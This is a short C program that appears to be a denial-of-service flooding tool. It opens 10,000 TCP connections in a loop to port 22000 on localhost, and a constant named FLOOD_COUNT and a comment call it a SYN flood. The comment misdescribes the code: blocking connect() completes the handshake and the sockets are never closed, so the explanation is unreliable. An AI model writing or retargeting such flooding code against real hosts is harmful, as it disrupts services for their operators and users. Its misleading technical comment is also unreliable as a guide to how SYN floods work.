#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>

#define FLOOD_COUNT 10000

int main(){
  int sockfd; 
  struct sockaddr_in servaddr; 

  for(int i=0; i<FLOOD_COUNT; i++){
    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    bzero(&servaddr, sizeof servaddr);

    servaddr.sin_family=AF_INET;
    servaddr.sin_port=htons(22000);
    servaddr.sin_addr.s_addr=inet_addr("127.0.0.1");

    // Send a SYN packet (connect() will send a SYN packet, but we won't complete the handshake)
    connect(sockfd, (struct sockaddr *)&servaddr, sizeof(servaddr));
  }

  return 0;
}